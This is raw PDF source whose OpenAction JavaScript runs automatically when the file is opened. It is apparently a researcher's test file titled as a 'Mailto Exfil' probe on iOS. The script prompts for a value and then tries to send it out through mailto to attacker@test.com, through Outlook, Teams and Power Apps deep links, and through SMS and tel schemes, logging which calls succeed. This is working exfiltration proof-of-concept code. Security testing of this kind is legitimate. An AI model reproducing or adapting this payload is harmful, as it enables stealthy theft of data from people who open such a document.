%PDF-1.7
% Mailto Exfil Correct Format - iOS - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      try {
        var results = [];

        var captured = app.response("Enter test value:", "Power Apps");

        results.push("captured: [" + captured + "]");

        if (captured !== null) {

          // === MAILTO CORRECT FORMAT ===
          results.push("=== MAILTO VARIANTS ===");

          // Variant 1: body only
          try {
            app.launchURL("mailto:?body=" + captured, false);
            results.push("mailto body: no throw");
          } catch(e) { results.push("mailto body: " + e); }

          // Variant 2: to + subject + body
          try {
            app.launchURL(
              "mailto:attacker@test.com?subject=PA&body=" + captured,
              false
            );
            results.push("mailto full: no throw");
          } catch(e) { results.push("mailto full: " + e); }

          // Variant 3: ms-outlook scheme
          try {
            app.launchURL(
              "ms-outlook://compose?to=attacker@test.com&body=" + captured,
              false
            );
            results.push("ms-outlook: no throw");
          } catch(e) { results.push("ms-outlook: " + e); }

          // Variant 4: ms-teams deep link with data
          try {
            app.launchURL(
              "msteams://teams.microsoft.com/l/chat/0/0?message=" + captured,
              false
            );
            results.push("msteams chat: no throw");
          } catch(e) { results.push("msteams chat: " + e); }

          // Variant 5: powerapps scheme with data
          try {
            app.launchURL(
              "powerapps://apps?data=" + captured,
              false
            );
            results.push("powerapps scheme: no throw");
          } catch(e) { results.push("powerapps scheme: " + e); }

          // Variant 6: tel scheme - does it dial?
          try {
            app.launchURL("tel:+1234567890", false);
            results.push("tel: no throw");
          } catch(e) { results.push("tel: " + e); }

          // Variant 7: sms scheme
          try {
            app.launchURL(
              "sms:+1234567890&body=" + captured,
              false
            );
            results.push("sms: no throw");
          } catch(e) { results.push("sms: " + e); }

        }

        app.alert(results.join("\\n"));

      } catch(e) {
        app.alert("OUTER ERROR: " + e);
      }
   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Mailto Exfil Test) Tj ET
BT /F1 12 Tf 50 220 Td (Watch for app switches) Tj ET
endstream
endobj

xref
0 6
0000000000 65535 f 
0000000015 00000 n 
0000000075 00000 n 
0000000135 00000 n 
0000002200 00000 n 
0000002360 00000 n 

trailer
<< /Size 6 /Root 1 0 R >>
startxref
2450
%%EOF